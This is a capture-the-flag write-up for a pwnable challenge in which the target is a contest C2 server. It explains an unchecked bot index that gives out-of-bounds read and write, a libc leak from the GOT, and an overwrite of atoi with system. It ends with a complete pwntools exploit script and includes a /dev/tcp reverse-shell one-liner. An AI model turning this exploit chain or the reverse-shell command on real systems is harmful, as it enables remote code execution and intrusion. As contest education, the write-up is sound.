+++
title = "WhiteHat Contest 2025 Quals - Search And Attack"
date = "2025-11-17"
description = "WhiteHat Contest 2025 Quals pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "pwninit", "improper check", "out of bound", "got overwrite", "reverse shell"]
+++

## 0x00. Introduction
``` bash
➜  tree .
.
├── 8f7c31c3010792cd92b452ac7223128f64189e61ee52fedc107c87a3408a66e9
└── cnc
    ├── 39fda5175d9a8746dea0cfbf05389ac2cfb85e531dbbe9e9aa517dfe9b7e6de2
    ├── 39fda5175d9a8746dea0cfbf05389ac2cfb85e531dbbe9e9aa517dfe9b7e6de2.c
    └── libc.so.6
```

The executable files for server and malware (supposedly), source code, and library file are given.
Initially, I thought I needed to analyze the `8f7c` file which is suspected to be malware, but it turned out completely unrelated to the challenge.

``` bash
[*] '/home/user/cnc/39fda5175d9a8746dea0cfbf05389ac2cfb85e531dbbe9e9aa517dfe9b7e6de2'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

The protection mechanisms applied to the C2 server file `39fd` are shown above.

### Environment
After a long time, instead of a docker environment, library file was provided, so I tried to load it with `LD_PRELOAD`, but linking didn't work well.

I eventually found and used a tool called [pwninit](https://github.com/io12/pwninit).
It not only finds and downloads a loader that can load a library file but also patches the binary to load the provided library.
It is a very simple yet powerful tool.

### Concept
``` bash
➜  ./39fda5175d9a8746dea0cfbf05389ac2cfb85e531dbbe9e9aa517dfe9b7e6de2
[*] Starting server on port 8080...
[*] Server listening on port 8080
```

Running the C2 server file opens port 8080 and waits as shown above.
When a request matching the C2 protocol arrives, it executes the corresponding logic.


## 0x01. Vulnerability
The code is about 500 lines, but I succeeded in exploitation with one vulnerability, so there might be others.

``` c
void update_bot(int bot_id, const char* data, size_t data_size) {
    pthread_mutex_lock(&bots_mutex);
    
    int index = bot_id;
    int field_count = 0;
    ...
    while (*ptr && field_count < 8) {
        if (*ptr == '|') {
            *ptr = '\0';
            fields[field_count++] = start;
            start = ptr + 1;
        }
        ptr++;
    }
    if (field_count < 8) {
        fields[field_count++] = start;
    }
    
    if (field_count > 0 && strlen(fields[0]) > 0) 
        memcpy(bots[index].hostname, fields[0], MAX_BUFFER_LEN - 1);
    
    if (field_count > 1 && strlen(fields[1]) > 0) 
        memcpy(bots[index].username, fields[1], MAX_BUFFER_LEN - 1);
    ...
    printf("[*] Bot updated: ID=%d\n", bot_id);
    
    pthread_mutex_unlock(&bots_mutex);
}

void detail_bot(int bot_id, int client_socket) {
    pthread_mutex_lock(&bots_mutex);
    
    char response[BUFFER_SIZE * 4] = {0};
    
    int index = bot_id;
    snprintf(response, sizeof(response), 
            "BOT_DETAIL|%d|%.255s|%.255s|%.15s|%.15s|%.255s|%.255s|%.63s|%.63s|%ld\n",
            bots[index].id,
            bots[index].hostname,
            bots[index].username,
            bots[index].public_ip,
            bots[index].private_ip,
            bots[index].os_info,
            bots[index].cpu_info,
            bots[index].ram_info,
            bots[index].disk_info,
            bots[index].last_seen);

    send(client_socket, response, strlen(response), 0);
    
    pthread_mutex_unlock(&bots_mutex);
}
```

Since `update_bot` and `detail_bot` don't verify `index`, OOB write and OOB read vulnerabilities occur respectively.


## 0x02. Exploit
### OOB Read
Since the maximum number of `bots` (`MAX_BOTS`) is as high as 1000, I was more interested in the area before `bots` than after.

First, to utilize OOB read, I wrote the payload as follows.

``` python
    s.sendline(b"DETAIL|-1")
    r = s.recv().split(b"|")[1:]
    for o, f in zip(order, r):
        print(f"{o} : {f}, len {len(f)}")
```

The output at this point is:

``` bash
id : b'0', len 1
hostname : b'', len 0
username : b'', len 0
public_ip : b'XXXXXXXXXXXXXXX', len 15
private_ip : b'XXXXXXXXXXXXXXX', len 15
os_info : b'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX', len 255
cpu_info : b'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX', len 32
ram_info : b'\xa0\x95\xd3\xf7\xff\x7f', len 6
disk_info : b'P\xec\xd0\xf7\xff\x7f', len 6
last_seen : b'0\n', len 2
```

Looking at `ram_info` and `disk_info`, we get libc addresses.
Printing the memory corresponding to the area above `bots` shows:

``` bash
gef➤  x/46gx 0x0000000000406000
0x406000 <free@got.plt>:        0x00007ffff7cadd30      0x00007ffff7d2bbe0
0x406010 <puts@got.plt>:        0x0000000000401050      0x00007ffff7d2c180
0x406020 <inet_ntoa@got.plt>:   0x00007ffff7d3c400      0x00007ffff7d2ba30
0x406030 <strlen@got.plt>:      0x00007ffff7d8b780      0x00000000004010a0
0x406040 <htons@got.plt>:       0x00007ffff7d395a0      0x00007ffff7d2bec0
0x406050 <printf@got.plt>:      0x00007ffff7c60100      0x00007ffff7c66370
0x406060 <memset@got.plt>:      0x00007ffff7d89440      0x0000000000401100
0x406070 <strcmp@got.plt>:      0x00007ffff7d8afd0      0x00007ffff7c451a0
0x406080 <memcpy@got.plt>:      0x00007ffff7d88a40      0x00007ffff7fc3a40
0x406090 <select@got.plt>:      0x00007ffff7d26bc0      0x00007ffff7ca1a70
0x4060a0 <malloc@got.plt>:      0x00007ffff7cad650      0x00007ffff7c9dc70
0x4060b0 <listen@got.plt>:      0x00007ffff7d2bb50      0x00007ffff7d395a0
0x4060c0 <bind@got.plt>:        0x00007ffff7d2b960      0x00007ffff7c9cbc0
0x4060d0 <perror@got.plt>:      0x00007ffff7c28a93      0x00007ffff7cb5c00
0x4060e0 <accept@got.plt>:      0x00007ffff7d2b820      0x00007ffff7c58750
0x4060f0 <strcat@got.plt>:      0x007ffff7d0ec507c      0x00007ffff7d0ec50
0x406100 <pthread_mutex_lock@got.plt>:  0x00007ffff7c9fff0      0x00007ffff7d2c310
0x406110:       0x0000000000000000      0x0000000000000000
0x406120 <server_running>:      0x0000000000000001      0x0000000000000000
0x406130:       0x0000000000000000      0x00000000691bb9f6
0x406140 <completed.0>: 0x0000000000000000      0x0000000000000000
0x406150:       0x0000000000000000      0x0000000000000000
0x406160 <bots>:        0x0000000000000000      0x0000000000000000
```

The libc addresses were printed through the GOT area.
The output addresses are libc addresses of `ntohs` and `sleep`.

### OOB Write
So I thought of a GOT overwrite scenario using `update_bot`, but made two mistakes in the process.

1. Since areas above GOT only have `r` permission, Segmentation Fault occurs when writing `hostname`, `username`, etc.
2. Only attempted to overwrite GOT of `ntohs` and `sleep`

These mistakes wouldn't have happened with careful code review, so I'm recording them for feedback.

``` c
if (field_count > 6 && strlen(fields[6]) > 0) 
    memcpy(bots[bot_index].ram_info, fields[6], MAX_IO_INFO_BUFFER_LEN - 1);
```

1. Since `memcpy` only happens when `strlen(field[i]) > 0`, leaving `field[i]` empty can skip the process of writing `hostname`, `username`, etc.
2. Since `memcpy` copies entire memory, we can overwrite GOT of other functions after instead of specifically `ntohs` or `sleep`

Anyway, to utilize OOB write for GOT overwrite, I printed the GOTs after `ntohs`.

``` bash
0x4060b8 <ntohs@got.plt>:       0x00007ffff7d395a0
0x4060c0 <bind@got.plt>:        0x00007ffff7d2b960
0x4060c8 <pthread_create@got.plt>:      0x00007ffff7c9cbc0
0x4060d0 <perror@got.plt>:      0x00007ffff7c28a93
0x4060d8 <strtok@got.plt>:      0x00007ffff7cb5c00
0x4060e0 <accept@got.plt>:      0x00007ffff7d2b820
0x4060e8 <atoi@got.plt>:        0x00007ffff7c58750
0x4060f0 <strcat@got.plt>:      0x007ffff7d0ec507c
0x4060f8 <sleep@got.plt>:       0x00007ffff7d0ec50
0x406100 <pthread_mutex_lock@got.plt>:  0x00007ffff7c9fff0
0x406108 <socket@got.plt>:      0x00007ffff7d2c310
0x406110:       0x0000000000000000
0x406118:       0x0000000000000000
0x406120 <server_running>:      0x0000000000000001
```

Among these functions, I looked for one convenient for passing input as an argument, and `atoi` looked good.

``` c
void* handle_client(void* arg) {
    ...
    else if (strcmp(cmd, CMD_DELETE) == 0) {
        char *bot_id_str = strtok(NULL, "|");
        if (bot_id_str) {
            int bot_id = atoi(bot_id_str);
            delete_bot(bot_id);
            char response[] = "DELETED|OK\n";
            send(client_socket, response, strlen(response), 0);
        }
    }
    ...
}
```

Since the string after `DELETE|` sent to the server goes directly into `bot_id_str`, if we change `atoi`'s GOT to `system`'s address, passing arguments becomes very convenient.
We need to preserve existing values since modifying other functions' GOTs likely causes errors.

So I wrote the payload as follows.

``` python
    payload = b"UPDATE|-1|"
    payload += b"|" * 6
    payload += p64(libc_base + lib.symbols['ntohs'])
    payload += p64(libc_base + lib.symbols['bind'])
    payload += p64(libc_base + lib.symbols['pthread_create'])
    payload += p64(libc_base + lib.symbols['perror'])
    payload += p64(libc_base + lib.symbols['strtok'])
    payload += p64(libc_base + lib.symbols['accept'])
    payload += p64(libc_base + lib.symbols['system'])       # atoi
    payload += b"|"
    payload += p64(sleep_addr)
    s.sendline(payload)

    print(s.recv())

    payload = b"DELETE|"
    payload += b"/bin/sh"
    s.sendline(payload)

    print(p.recv())
```

Here, passing `/bin/sh` as `system`'s argument was sufficient, but depending on the environment, arguments like this might be needed:

- `bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'`


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
from argparse import ArgumentParser

BINARY = "39fda5175d9a8746dea0cfbf05389ac2cfb85e531dbbe9e9aa517dfe9b7e6de2_patched"
LIBRARY = "libc.so.6"
CONTAINER = ""
code_base = 0x555555554000
bp = {
    'main' : code_base + 0x16ae,
}
gs = f'''
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def main(server, port, debug):
    if(port):
        s = remote(server, port)
        if debug:
            pid = os.popen(f"sudo docker top {CONTAINER} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
            gdb.attach(int(pid), gs, exe=BINARY)
    else:
        p = process(BINARY)
        if debug:
            gdb.attach(p, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)
    order = ["id", "hostname", "username", "public_ip", "private_ip", "os_info", "cpu_info", "ram_info", "disk_info", "last_seen"]

    print(p.recvuntil(b"8080\n"))

    s = remote("127.0.0.1", 8080)

    s.sendline(b"DETAIL|-1")
    r = s.recv().split(b"|")[1:]
    for o, f in zip(order, r):
        print(f"{o} : {f}, len {len(f)}")
    ntohs_addr = u64(r[-3] + b"\x00\x00")
    sleep_addr = u64(r[-2] + b"\x00\x00")
    libc_base = sleep_addr - lib.symbols['sleep']

    log.info(f"ntohs_addr : {hex(ntohs_addr)}")
    log.info(f"sleep_addr : {hex(sleep_addr)}")
    log.info(f"libc_base  : {hex(libc_base)}")

    payload = b"UPDATE|-1|"
    payload += b"|" * 6
    payload += p64(libc_base + lib.symbols['ntohs'])
    payload += p64(libc_base + lib.symbols['bind'])
    payload += p64(libc_base + lib.symbols['pthread_create'])
    payload += p64(libc_base + lib.symbols['perror'])
    payload += p64(libc_base + lib.symbols['strtok'])
    payload += p64(libc_base + lib.symbols['accept'])
    payload += p64(libc_base + lib.symbols['system'])       # atoi
    payload += b"|"
    payload += p64(sleep_addr)
    s.sendline(payload)

    print(s.recv())

    payload = b"DELETE|"
    payload += b"/bin/sh"
    s.sendline(payload)

    print(p.recv())

    p.interactive()

if __name__=='__main__':
    parser = ArgumentParser()
    parser.add_argument('-s', '--server', type=str, default="0.0.0.0")
    parser.add_argument('-p', '--port', type=int)
    parser.add_argument('-d', '--debug', type=int, default=1)
    args = parser.parse_args()
    main(args.server, args.port, args.debug)
```